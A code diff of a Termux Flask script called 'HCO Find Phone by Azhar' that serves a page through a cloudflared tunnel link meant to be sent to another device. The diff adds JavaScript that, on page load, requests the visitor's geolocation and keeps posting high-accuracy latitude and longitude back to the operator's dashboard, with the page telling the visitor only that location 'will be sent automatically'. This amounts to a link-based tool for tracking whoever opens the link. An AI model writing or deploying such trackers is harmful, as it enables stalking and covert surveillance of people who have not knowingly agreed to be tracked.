@@ -2,7 +2,7 @@
 # Requirements: Termux, Python3, Flask, cloudflared, Termux:API
 
 import os, subprocess, threading, time, re
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, jsonify
 
 RED = "\033[91m"
 GREEN = "\033[92m"
@@ -19,6 +19,27 @@ dashboard_template = """
 <head>
 <meta charset="UTF-8">
 <title>HCO Find Phone by Azhar</title>
+<script>
+function sendLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.watchPosition(function(position){
+            fetch('/update', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude
+                })
+            });
+        }, function(error){
+            alert("Location access denied or unavailable.");
+        }, { enableHighAccuracy: true });
+    } else {
+        alert("Geolocation is not supported by your browser");
+    }
+}
+window.onload = sendLocation;
+</script>
 <style>
 body { background:black; color:red; text-align:center; font-family:Arial; }
 h1 { font-size:50px; margin-top:50px; }
@@ -27,21 +48,12 @@ p { font-size:25px; color:green; }
 </head>
 <body>
 <h1>HCO FIND PHONE BY AZHAR</h1>
-<p>Send this link to the device to track location:</p>
-<p>{{ link }}</p>
-<p id="location">Waiting for live location updates...</p>
-
+<p>Your location will be sent automatically to the Termux dashboard.</p>
+<p id="status">Waiting for permission...</p>
 <script>
-function updateLocation() {
-    fetch('/location')
-    .then(response => response.json())
-    .then(data => {
-        if(data.lat && data.lon){
-            document.getElementById('location').innerHTML = 'LIVE LOCATION → Lat: ' + data.lat + ', Lon: ' + data.lon;
-        }
-    });
-}
-setInterval(updateLocation,3000);
+navigator.geolocation.getCurrentPosition(function(position){
+    document.getElementById('status').innerHTML = 'Location access granted. Sending updates...';
+});
 </script>
 </body>
 </html>
@@ -49,11 +61,11 @@ setInterval(updateLocation,3000);
 
 @app.route('/')
 def dashboard():
-    return render_template_string(dashboard_template, link=cloudflare_link)
+    return render_template_string(dashboard_template)
 
 @app.route('/location')
 def get_location():
-    return locations if locations else {}
+    return jsonify(locations)
 
 @app.route('/update', methods=['POST'])
 def update_location():
@@ -104,7 +116,6 @@ def start_cloudflared():
             if match:
                 cloudflare_link = match.group(1)
                 break
-    # If URL still not found, fallback
     if not cloudflare_link:
         print("Could not detect Cloudflare URL automatically. Please paste it manually:")
         cloudflare_link = input()
